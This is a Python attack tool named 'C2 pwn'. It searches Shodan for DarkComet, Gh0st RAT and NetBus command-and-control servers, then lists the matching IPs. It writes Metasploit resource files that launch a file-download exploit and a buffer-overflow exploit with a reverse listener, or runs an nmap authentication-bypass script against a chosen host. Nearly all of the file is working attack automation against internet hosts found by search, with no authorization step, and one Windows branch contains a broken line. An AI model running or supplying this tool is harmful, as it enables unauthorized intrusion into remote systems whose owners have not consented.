## Author: LukeBob
## Automate Pwning C2 "Command and Controll" Servers Using Vulnerable Versions
## C2 pwn

import os
import shodan
from time import sleep
import argparse

Nmap_path = ''  ## <--- Only Needed For Windows


## Colours
class Color():
    @staticmethod
    def red(str):
        return "\033[91m" + str + "\033[0m"
    @staticmethod
    def green(str):
        return "\033[92m" + str + "\033[0m"
    @staticmethod
    def yellow(str):
        return "\033[93m" + str + "\033[0m"
    @staticmethod
    def blue(str):
        return "\033[94m" + str + "\033[0m"


banner =(Color.green("""
   ___ ____      ___
  / __\___ \    / _ \_      ___ __
 / /    __) |  / /_)| \ /\ / / '_ '
/ /___ / __/  / ___/ \ V  V /| | | |
\____/|_____| \/      \_/\_/ |_| |_|
""")+"("+Color.blue("V-1.0")+")"+Color.blue(" Author: LukeBob"))



def print_output(LPORT):
    print(
        """
----------------------------------------------------------------------------------
~                                    RESULT                                     ~
----------------------------------------------------------------------------------
~  Now You Can Launch The Exploit With, msfconsole -r DarkComet_Metasploit.rc   ~
~        Remember, if you are behind nat, port forward port (%s)                ~
----------------------------------------------------------------------------------
        """%(LPORT))


# writes rc files
def build_rc(payload,rport,lport,lhost,rhost):
    rc_data = (
        """
use %s
set RPORT %s
set LPORT %s
set LHOST %s
set RHOST %s
exploit
        """%(payload,rport,lport,lhost,rhost))

    if payload == 'auxiliary/gather/darkcomet_filedownloader':
        with open("DarkComet_Metasploit.rc", "w+") as file:
            file.write(rc_data)

    elif payload == 'exploit/windows/misc/gh0st':
        with open("GhostRat_Metasploit.rc", "w+") as file:
            file.write(rc_data)


## keywords you can use on shodan "free version" to pickup C2 Servers
## On paid version you get much more and you can use filtering example (category: "malware" product: "DarkComet")
malware_terms = {
    "DarkComet"   : "BF7CAB464EFB",
    "Gh0stRat"    : "gh0st",
    "NetBus"      : "NetBus 1.60"
}

## Creates New Shodan Api Object
def get_api(api_key):
    try:
        print('\n---------------------------------\n'+Color.green('Connecting To Shodan API...')+'\n---------------------------------')
        api = shodan.Shodan(api_key)
        sleep(1)
        api.info()
        print(Color.green('Created New Api Instance!')+'\n---------------------------------\n\n\n')
        return(api)
    except shodan.exception.APIError as e:
        print(Color.red('\t[#] Error:')+' %s' % e)
        exit(0)

## Gets Back Results in Dictionary Format
def search(api, term, name):
    try:
        results = api.search(term)
        return results
    except shodan.APIError as e:
        print(Color.red('Error:')+' %s' % e)
        exit(0)

## Parses Choices From User And Sends Them To Rc Class.
def pwn_one(results, name):
    print("""
---------------------------------
~           %s            ~
---------------------------------
(1) List Available %s Targets
(2) Quit
---------------------------------
    """%(Color.blue("Options"), name))
    sing_choice = input('[*] Option (1,2): ')
    if sing_choice == '1':
        print('\n\n----------------------------\n %s C2 Server List\n----------------------------\n\n'%(name))
        for i in results['matches']:
            p_ip = Color.yellow("[IP]: ")
            p_port = Color.blue("[Port]: ")

            print("[IP]: {0}\t[PORT]: {1}".format(i['ip_str'], i['port']))
        print("\n")

        ## user input for target ip and port.
        IP    = input(Color.red("Target Ip: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(IP)))
        PORT  = input(Color.red("Target Port: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(PORT)))
        LIP   = input(Color.red("Listner Ip: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(LIP)))
        LPORT = input(Color.red("Listner Port: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(LPORT)))

        ## DarkComet rc
        if name == "DarkComet":
            build_rc("auxiliary/gather/darkcomet_filedownloader",PORT,LPORT,LIP,IP)
            if os.name != 'nt':
                os.system("service postgresql restart")
            print_output(LPORT)

            sleep(7)

        ## Gh0st rc
        if name == 'gh0st':
            build_rc("exploit/windows/misc/gh0st",PORT,LPORT,LIP,IP)
            if os.name != 'nt':
                os.system("service postgresql restart")
            print_output(LPORT)
            sleep(10)

        ## Only nmap module available atm :(
        if name == "NetBus":
            print("\n\t[#]Trying Auth Bypass ... ")

            if os.name != 'nt':
                NB_comm = "nmap -p %s --script netbus-auth-bypass %s"%(PORT,IP)
            elif os.name == 'nt':
                if Nmap_path != '':
                    try:
                        NB_comm = "%s -p %s --script netbus-auth-bypass %s"%(Nmap_path,PORT.IP)
                    except:
                        raise
                elif Nmap_path == '':
                    print("\n\n\t[#] Requires Path To Nmap Binary To Continue.")
                    sleep(2)
                    quit(0)

            os.system(NB_comm)

    ## Quit
    elif sing_choice == '2':
        print(Color.green("\n\n[#]")+"Shutting Down..\n")
        quit(0)


def main(key):
    quit = False

    ## Creates API Instance
    api = get_api(key)

    ## Main Loop
    while not quit:
        print("""
-----------------------------------------------------------------------------------------------------------------------------------------------------
~                                                               C2 ServerList                                                                       ~
-----------------------------------------------------------------------------------------------------------------------------------------------------
(1) DarkComet   <-- DarkComet Server Remote File Download Exploit <---> https://www.rapid7.com/db/modules/auxiliary/gather/darkcomet_filedownloader
(2) Gh0stRat    <-- Gh0st Client buffer Overflow                  <---> https://www.rapid7.com/db/modules/exploit/windows/misc/gh0st
(3) NetBus      <-- Netbus Auth Bypass                            <---> https://nmap.org/nsedoc/scripts/netbus-auth-bypass.html
(4) Quit
-----------------------------------------------------------------------------------------------------------------------------------------------------
        """)
        number = input("\n[*] C2 Server Kind To Exploit (1,2,3,4): ")
        print("\n\n")

        ## Search Shodan For DarkComet C2 Servers
        if number == '1':
            name="DarkComet"
            new_dict = search(api, term=malware_terms["DarkComet"], name=name)

        ## Search Shodan For GhostRat C2 Servers
        if number == '2':
            name="gh0st"
            new_dict = search(api, term=malware_terms["Gh0stRat"], name=name)

        ## Search Shodan For NetBus Trojan C2 Servers
        if number == '3':
            name="NetBus"
            new_dict = search(api, term=malware_terms["NetBus"], name=name)

        ## Quit
        if number == '4':
            print(Color.green("\nShutting Down..."))
            quit = True
        if not quit:
            pwn_one(new_dict, name)

if __name__ == '__main__':
        print(banner)
        sleep(1)
        ## ArgParse Stuff
        parser = argparse.ArgumentParser(description='C2 Pwn')
        parser.add_argument('--key', help='Shodan Api Key')
        args = parser.parse_args()
        if args.key:
            key = args.key
            main(key)
        else:
            parser.print_help()
            quit(0)
